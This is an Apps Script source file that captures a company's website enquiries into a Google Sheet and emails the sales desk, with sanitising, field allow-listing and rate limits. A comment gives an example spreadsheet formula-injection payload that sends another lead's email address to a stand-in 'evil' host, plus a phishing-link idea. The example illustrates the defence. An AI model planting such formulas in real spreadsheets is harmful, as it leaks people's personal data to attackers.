/**
 * Aurico Alloys - website enquiry capture.
 *
 * Receives enquiries from javascript/floating-form.js, writes them to a sheet,
 * and optionally emails the sales desk. Replaces the earlier script, which had
 * a fixed set of columns and silently discarded any field it did not recognise
 * - which is how "company" and "quantity" would otherwise vanish.
 *
 * This version reads the keys off the payload and adds a column for anything on
 * the ALLOWED list, so adding a field to the form is a one-line change here
 * rather than a rewrite. Nothing on that list is dropped.
 *
 * ---------------------------------------------------------------------------
 * WHY THE PAYLOAD IS FILTERED AND EVERY CELL IS SANITISED
 * ---------------------------------------------------------------------------
 * This endpoint is deployed "Who has access: Anyone", because the browser has
 * to be able to POST to it without a credential. That is not a mistake to fix -
 * it is what a public enquiry form requires - but it does mean every byte
 * arriving here was written by a stranger, and two things follow from that:
 *
 * 1. A cell beginning = + - or @ is a FORMULA to Google Sheets, not text. A
 *    name submitted as =IMPORTDATA("https://evil/"&ENCODEURL(B2)) executes when
 *    the desk opens the sheet and sends another lead's email address to whoever
 *    wrote it; HYPERLINK() puts a phishing link in the cell under a label of
 *    the attacker's choosing. Every value is therefore prefixed with a single
 *    quote when it opens with one of those characters, which Sheets stores as
 *    text and does not display.
 *
 * 2. syncHeaders() used to add a column for ANY key on the payload. A single
 *    POST carrying 20,000 invented keys would push the sheet past its column
 *    limit, after which every appendRow throws and NO further lead is captured
 *    - every visitor sent to the WhatsApp fallback instead. Keys are now
 *    checked against ALLOWED_FIELDS and anything else is counted and dropped.
 *
 * Neither guard can reject a lead: a sanitised cell is still the visitor's text
 * and a dropped key was never a column. The failure this endpoint must never
 * have is a lost enquiry.
 *
 * ---------------------------------------------------------------------------
 * UPDATING THE EXISTING DEPLOYMENT   (this is the usual case)
 * ---------------------------------------------------------------------------
 * The website already points at a deployment. Updating it in place keeps the
 * same /exec URL, so nothing on the site has to change.
 *
 * 1. Open the leads Google Sheet -> Extensions -> Apps Script.
 * 2. Select all the old code and replace it with this file.
 * 3. Save.
 * 4. Deploy -> Manage deployments -> click the active deployment ->
 *    pencil/edit icon -> Version: "New version" -> Deploy.
 *
 * Do NOT use "New deployment" for an update: that mints a different /exec URL
 * and the site keeps talking to the old code. And editing without deploying a
 * new version changes nothing either - the previous version keeps serving.
 *
 * ---------------------------------------------------------------------------
 * FIRST-TIME SETUP
 * ---------------------------------------------------------------------------
 * 1. Open the Google Sheet that should hold the leads.
 * 2. Extensions -> Apps Script. Delete whatever is there, paste this in.
 * 3. Deploy -> New deployment -> type "Web app".
 *      Execute as:      Me
 *      Who has access:  Anyone            <- required, or the browser gets a 401
 * 4. Copy the /exec URL into LEAD_ENDPOINTS in javascript/lead-config.js.
 *
 * ---------------------------------------------------------------------------
 * OPTIONAL - EMAIL ALERTS
 * ---------------------------------------------------------------------------
 * Project Settings -> Script Properties -> add NOTIFY_EMAIL = you@domain
 *
 * ---------------------------------------------------------------------------
 * WHICH TAB THE LEADS LAND IN
 * ---------------------------------------------------------------------------
 * SHEET_NAME below is the tab this writes to, and it is created if missing.
 * Column headings are matched to the payload keys exactly and case-sensitively,
 * so pointing this at an existing tab whose headings read "Name" or "Mobile
 * Number" will not reuse those columns - it will add "name" and "phone"
 * alongside them. Letting it start a clean tab avoids the whole problem, and
 * leaves the historic leads untouched in the old one.
 *
 * ---------------------------------------------------------------------------
 * WHY THE RESPONSE SHAPE MATTERS
 * ---------------------------------------------------------------------------
 * ContentService cannot set an HTTP status code - every reply is 200, even
 * after an exception. The website therefore reads {ok:...} out of the body to
 * decide whether the lead really landed, and treats {ok:false} as a hard
 * failure that shows the visitor a WhatsApp fallback. Keep that contract.
 */

var SHEET_NAME = 'Leads';

/**
 * Preferred left-to-right column order. Anything the form sends that is not
 * listed here is still recorded - it just gets appended on the right.
 */
var COLUMN_ORDER = [
  'timestamp',
  'name',
  'company',
  'email',
  'phone',
  'country',
  'quantity',
  'inquiry',
  'page_url',
  'page_title',
  'form_location',
  'utm_source',
  'utm_medium',
  'utm_campaign',
  'utm_term',
  'utm_content',
  'gclid',
  'landing_page',
  'referrer',
  'privacy',
  'page'
];

/**
 * The only keys that may become columns. COLUMN_ORDER is the whole set the form
 * sends; anything else on a payload was not sent by this site's form, so it is
 * counted and dropped rather than given a column of its own. Add a field here
 * in the same commit that adds it to floating-form.js.
 */
var ALLOWED_FIELDS = COLUMN_ORDER;

/** A lead longer than this is not a lead. Sheets caps a cell at 50,000 chars. */
var MAX_FIELD_CHARS = 5000;

/** Whole-body cap, checked before JSON.parse so a huge body costs nothing. */
var MAX_BODY_BYTES = 64 * 1024;

/**
 * Notification emails allowed per rolling hour. MailApp's daily quota is finite
 * (100 on a consumer account), so a flood of junk submissions would otherwise
 * burn it before lunch and the desk would stop being told about the REAL leads
 * for the rest of the day. Past the cap the lead is still written to the sheet -
 * only the email is skipped - because a lead in the sheet is recoverable and a
 * lead that was never captured is not.
 */
var MAX_NOTIFY_PER_HOUR = 40;

/**
 * Makes one value safe to put in a cell.
 *
 * Sheets parses a leading = + - or @ as a formula, so a submitted value
 * starting with one of those is prefixed with a single quote - Sheets stores
 * that as text and does not render the quote. Leading tabs and carriage
 * returns get the same treatment: they are stripped by the parser first, which
 * would expose the character behind them.
 */
function sanitizeCell(value) {
  if (value === undefined || value === null) return '';

  var text = String(value);

  // Objects and arrays would otherwise land as "[object Object]".
  if (typeof value === 'object') {
    try {
      text = JSON.stringify(value);
    } catch (err) {
      text = '';
    }
  }

  if (text.length > MAX_FIELD_CHARS) {
    text = text.slice(0, MAX_FIELD_CHARS) + ' [truncated]';
  }

  if (/^[=+\-@\t\r]/.test(text)) {
    text = "'" + text;
  }

  return text;
}

/** Strips anything that is not an expected field, and sanitises what is left. */
function cleanPayload(data) {
  var clean = {};
  var dropped = 0;

  Object.keys(data).forEach(function (key) {
    if (ALLOWED_FIELDS.indexOf(key) === -1) {
      dropped++;
      return;
    }
    clean[key] = sanitizeCell(data[key]);
  });

  if (dropped) {
    console.warn('Dropped ' + dropped + ' unrecognised field(s) from a submission.');
  }

  return clean;
}

/**
 * True while the hour still has notification budget left. Counted in the script
 * cache rather than a property so it expires on its own and needs no cleanup.
 */
function notifyBudgetRemains() {
  try {
    var cache = CacheService.getScriptCache();
    var key = 'notify_count';
    var count = Number(cache.get(key) || 0);
    if (count >= MAX_NOTIFY_PER_HOUR) return false;
    cache.put(key, String(count + 1), 3600);
    return true;
  } catch (err) {
    // The cache being unavailable must not stop a notification going out.
    return true;
  }
}

function doPost(e) {
  var lock = LockService.getScriptLock();

  try {
    // Two submissions arriving together could otherwise both try to add the
    // same column, or write to the same row.
    lock.waitLock(30000);
  } catch (err) {
    return jsonReply({ ok: false, error: 'Server busy, please retry' });
  }

  try {
    if (!e || !e.postData || !e.postData.contents) {
      return jsonReply({ ok: false, error: 'Empty request body' });
    }

    // Checked before the parse: a multi-megabyte body should cost nothing.
    if (e.postData.contents.length > MAX_BODY_BYTES) {
      return jsonReply({ ok: false, error: 'Request body too large' });
    }

    var parsed = JSON.parse(e.postData.contents);

    // A JSON array or a bare string parses fine and would then have its indices
    // read as field names. Only an object is a payload.
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
      return jsonReply({ ok: false, error: 'Malformed request body' });
    }

    if (!parsed.email && !parsed.phone) {
      return jsonReply({ ok: false, error: 'Enquiry needs an email or a phone number' });
    }

    var data = cleanPayload(parsed);

    var sheet = getSheet();
    var headers = syncHeaders(sheet, data);

    var row = headers.map(function (key) {
      var value = data[key];
      return value === undefined || value === null ? '' : String(value);
    });

    sheet.appendRow(row);
    var rowNumber = sheet.getLastRow();

    notify(data, rowNumber);

    // rowNumber is a stable identifier for this enquiry. When the CRM hop is
    // built, "enquiry:" + rowNumber is the external_id it should dedupe on.
    return jsonReply({ ok: true, id: rowNumber });
  } catch (err) {
    // Logged so a failure is diagnosable in Executions rather than invisible.
    console.error('Lead capture failed: ' + err);
    return jsonReply({ ok: false, error: String(err && err.message ? err.message : err) });
  } finally {
    lock.releaseLock();
  }
}

/** Health check, so the deployment can be verified in a browser. */
function doGet() {
  return jsonReply({ ok: true, service: 'aurico-lead-capture' });
}

function getSheet() {
  var book = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = book.getSheetByName(SHEET_NAME);

  if (!sheet) {
    sheet = book.insertSheet(SHEET_NAME);
  }
  return sheet;
}

/**
 * Returns the header row, having first added a column for any key on the
 * payload that does not have one yet. New sheets are seeded in COLUMN_ORDER so
 * the common fields read left to right in a sensible order.
 */
function syncHeaders(sheet, data) {
  var lastColumn = sheet.getLastColumn();
  var headers = lastColumn
    ? sheet.getRange(1, 1, 1, lastColumn).getValues()[0].filter(String)
    : [];

  if (!headers.length) {
    headers = COLUMN_ORDER.filter(function (key) {
      return Object.prototype.hasOwnProperty.call(data, key);
    });
  }

  var missing = Object.keys(data).filter(function (key) {
    return headers.indexOf(key) === -1;
  });

  if (missing.length) {
    // Keep known fields in the preferred order; genuinely new ones go on the end.
    missing.sort(function (a, b) {
      var ai = COLUMN_ORDER.indexOf(a);
      var bi = COLUMN_ORDER.indexOf(b);
      if (ai === -1 && bi === -1) return a.localeCompare(b);
      if (ai === -1) return 1;
      if (bi === -1) return -1;
      return ai - bi;
    });
    headers = headers.concat(missing);
  }

  var headerRange = sheet.getRange(1, 1, 1, headers.length);
  headerRange.setValues([headers]);
  headerRange.setFontWeight('bold');
  sheet.setFrozenRows(1);

  return headers;
}

/**
 * Emails the sales desk. A lead sitting unread in a spreadsheet is not much
 * better than a lead that was never captured, and the site now promises a reply
 * within one working day.
 */
function notify(data, rowNumber) {
  var to = PropertiesService.getScriptProperties().getProperty('NOTIFY_EMAIL');
  if (!to) return;

  if (!notifyBudgetRemains()) {
    // The lead is already in the sheet; only the alert is skipped. Logged so a
    // flood is visible in Executions rather than looking like a quiet hour.
    console.warn('Notification skipped: hourly cap reached. Lead #' + rowNumber + ' is in the sheet.');
    return;
  }

  // The subject carries two visitor-supplied fields, so it is the one place an
  // attacker could write a line of their own choosing into the desk's inbox
  // list - "Website enquiry #7 - ACTION REQUIRED: verify your account". Newlines
  // out, length capped, so it stays a subject line and reads as one.
  var tidy = function (value) {
    return String(value || '').replace(/[\r\n]+/g, ' ').trim().slice(0, 80);
  };

  var subject = 'Website enquiry #' + rowNumber +
    (data.company ? ' - ' + tidy(data.company) : '') +
    (data.country ? ' (' + tidy(data.country) + ')' : '');

  var lines = [
    'Name:     ' + (data.name || '-'),
    'Company:  ' + (data.company || '-'),
    'Email:    ' + (data.email || '-'),
    'Phone:    ' + (data.phone || '-'),
    'Country:  ' + (data.country || '-'),
    'Quantity: ' + (data.quantity || '-'),
    '',
    'Enquiry:',
    data.inquiry || '-',
    '',
    'Page:     ' + (data.page_url || data.page || '-'),
    'Source:   ' + (data.utm_source || data.referrer || 'direct'),
    'Campaign: ' + (data.utm_campaign || '-')
  ];

  try {
    MailApp.sendEmail({ to: to, subject: subject, body: lines.join('\n') });
  } catch (err) {
    // A failed notification must never fail the capture - the lead is already
    // safely in the sheet by this point.
    console.error('Notification email failed: ' + err);
  }
}

function jsonReply(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}
